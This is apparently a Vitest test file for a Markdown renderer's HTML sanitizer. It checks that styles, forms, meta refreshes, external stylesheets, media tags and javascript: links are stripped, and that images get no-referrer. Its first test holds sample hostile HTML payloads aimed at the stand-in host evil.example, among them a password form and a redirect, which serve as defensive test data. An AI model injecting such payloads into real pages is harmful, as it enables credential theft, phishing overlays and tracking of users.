import { describe, expect, it } from 'vitest'
import { create_marked, sanitize } from './utils'

// No DOMParser under the node environment, so this exercises the server branch
// of sanitize(). Both branches read the same allow-list.
const marked = create_marked({ header_links: false, line_breaks: true })
const render = (markdown: string) => sanitize(marked.parse(markdown) as string)

describe('sanitize', () => {
  it('drops markup that can restyle, submit or phone home', () => {
    const html = render(
      [
        '<style>@import url(https://evil.example/x.css)</style>',
        '<div style="position:fixed;inset:0">overlay</div>',
        '<form action="https://evil.example"><input name="password"></form>',
        '<meta http-equiv="refresh" content="0;url=https://evil.example">',
        '<link rel="stylesheet" href="https://evil.example/x.css">',
        '<canvas></canvas><video src="x"></video><audio src="x"></audio>',
        '<a href="javascript:alert(1)">x</a>'
      ].join('\n\n')
    )

    for (const dropped of [
      '<style',
      'style=',
      '<form',
      '<input',
      '<meta',
      '<link',
      '<canvas',
      '<video',
      '<audio',
      'javascript:'
    ]) {
      expect(html).not.toContain(dropped)
    }
  })

  it('keeps what the renderer emits', () => {
    const html = render('# T\n\n| a | b |\n|:--|--:|\n| 1 | 2 |\n\n```python\nx = 1\n```')

    expect(html).toContain('<th align="left">a</th>')
    expect(html).toContain('class="copy_code_button"')
    expect(html).toContain('<code class="language-python">')
    expect(html).toContain('class="token operator"')
  })

  it('keeps images from telling their host which page is open', () => {
    expect(render('![alt](https://ok.example/i.png)')).toContain('referrerpolicy="no-referrer"')
  })
})
